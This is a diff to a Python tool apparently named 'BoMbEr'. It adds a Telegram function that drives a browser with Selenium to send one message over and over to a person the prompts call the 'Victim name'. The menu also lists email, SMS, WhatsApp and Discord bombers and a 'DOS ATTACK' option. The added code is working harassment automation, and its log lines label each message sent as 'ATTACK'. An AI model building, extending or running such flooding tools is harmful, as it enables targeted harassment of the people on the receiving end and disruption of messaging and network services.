@@ -53,6 +53,7 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.action_chains import ActionChains
 from selenium.common.exceptions import StaleElementReferenceException 
 
 if platform=='win32':
@@ -9624,16 +9625,16 @@ def dos():
 		ex()
 
 def wtsap():
-	print("\033[32m{}" .format('''
+	print('''\033[32m
 ╔╗╔╗╔╦╗    ╔╗   ╔═══╗
 ║║║║║║║   ╔╝╚╗  ║╔═╗║
 ║║║║║║╚═╦═╩╗╔╬══╣║ ║╠══╦══╗
 ║╚╝╚╝║╔╗║╔╗║║║══╣╚═╝║╔╗║╔╗║
 ╚╗╔╗╔╣║║║╔╗║╚╬══║╔═╗║╚╝║╚╝║
  ╚╝╚╝╚╝╚╩╝╚╩═╩══╩╝ ╚╣╔═╣╔═╝
-					║║ ║║
-					╚╝ ╚╝
-		'''))
+		    ║║ ║║
+		    ╚╝ ╚╝
+		''')
 
 	try:
 		name = input("Victim name: ")
@@ -9709,54 +9710,98 @@ def dscrd():
 		print("\033[31m{}" .format("\nERROR!"))
 		ex()
 
+def telega():
+	print('''\033[32m
+╔════╗ ╔╗
+║╔╗╔╗║ ║║
+╚╝║║╠╩═╣║╔══╦══╦═╦══╦╗╔╗
+  ║║║ ═╣║║ ═╣╔╗║╔╣╔╗║╚╝║
+  ║║║ ═╣╚╣ ═╣╚╝║║║╔╗║║║║
+  ╚╝╚══╩═╩══╩═╗╠╝╚╝╚╩╩╩╝
+            ╔═╝║
+            ╚══╝
+		''')
+	try:
+		name = input("Victim name: ")
+		count = int(input("Number of messages: "))
+		msg = input("Text: ")
+		cn=0
+
+		print("")
+		print("YOU HAVE 35 SECONDS TO LOG IN!")
+		input("Press Enter to start")
+
+		driver = webdriver.Chrome(ChromeDriverManager().install()) 
+		driver.get("https://web.telegram.org/k")
+		time.sleep(35)
+		search = driver.find_element(By.XPATH, "//*[@id='column-left']/div/div/div[1]/div[2]/input")
+		search.send_keys(name, Keys.RETURN)
+		time.sleep(8)
+		search2 = driver.find_element(By.XPATH, "//*[@id='search-container']/div[2]/div/div/div[1]/div/div[1]/ul")
+		driver.implicitly_wait(10)
+		ActionChains(driver).move_to_element(search2).click(search2).perform()
+		time.sleep(15)
+		msgBox = driver.find_element(By.XPATH,"//*[@id='column-center']/div/div/div[4]/div/div[1]/div[7]/div[1]/div[1]")
+
+		for i in range(count):
+			msgBox.send_keys(msg, Keys.RETURN)
+			cn+=1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'ATTACK') + "\033[37m {}" .format('|') + "\033[36m {}" .format(cn) + "\033[37m {}" .format('|') + "\033[35m {}" .format(name))
+
+		print("\033[32m {}" .format("Successful!"))
+		print(f"{cn} messages were sent to {name}")
+		ex()
+	except:
+		print("\033[31m{}" .format('ERROR!'))
+		ex()
+
 def main():
 	print('''\033[0m\033[40m\033[36m
 [0] Update the program   [4] WhatsApp
 [1] Email                [5] Discord
-[2] SMS                  [6] Clear the program cache
-[3] DOS ATTACK
+[2] SMS                  [6] Telegram
+[3] DOS ATTACK           [7] Clear the program cache
 	''')
 
-	try:
-		ans=int(input("\033[33m{}" .format("> ")))
-		print("")
+	ans=int(input("\033[33m{}" .format("> ")))
+	print("")
 
-		if ans==0:
-			check_internet()
-			os.system('git clone https://github.com/ebankoff/BoMbEr')
-			pb3()
-			print("\033[32m{}" .format('Success!'))
-			print("\033[31m{}" .format('To complete the update, you need to restart the program'))
+	if ans==0:
+		check_internet()
+		os.system('git clone https://github.com/ebankoff/BoMbEr')
+		pb3()
+		print("\033[32m{}" .format('Success!'))
+		print("\033[31m{}" .format('To complete the update, you need to restart the program'))
+		ex()
+	elif ans==1:
+		check_internet()
+		emailbomber()
+	elif ans==2:
+		check_internet()
+		smsbomber()
+	elif ans==3:
+		check_internet()
+		dos()
+	elif ans==4:
+		check_internet()
+		wtsap()
+	elif ans==5:
+		check_internet()
+		dscrd()
+	elif ans==6:
+		check_internet()
+		telega()
+	elif ans==7:
+		try:
+			pb4()
+			shutil.rmtree('__pycache__')
+			print('Success!')
 			ex()
-		elif ans==1:
-			check_internet()
-			emailbomber()
-		elif ans==2:
-			check_internet()
-			smsbomber()
-		elif ans==3:
-			check_internet()
-			dos()
-		elif ans==4:
-			check_internet()
-			wtsap()
-		elif ans==5:
-			check_internet()
-			dscrd()
-		elif ans==6:
-			try:
-				pb4()
-				shutil.rmtree('__pycache__')
-				print('Success!')
-				ex()
-			except:
-				print("\033[31m{}" .format('ERROR: The program cache is already empty!'))
-				ex()
-		else:
-			print("\033[31m{}" .format('ERROR: INVALID VALUE!'))
+		except:
+			print("\033[31m{}" .format('ERROR: The program cache is already empty!'))
 			ex()
-	except:
-		print("\033[31m{}" .format('ERROR!'))
+	else:
+		print("\033[31m{}" .format('ERROR: INVALID VALUE!'))
 		ex()
 
 if __name__=='__main__':
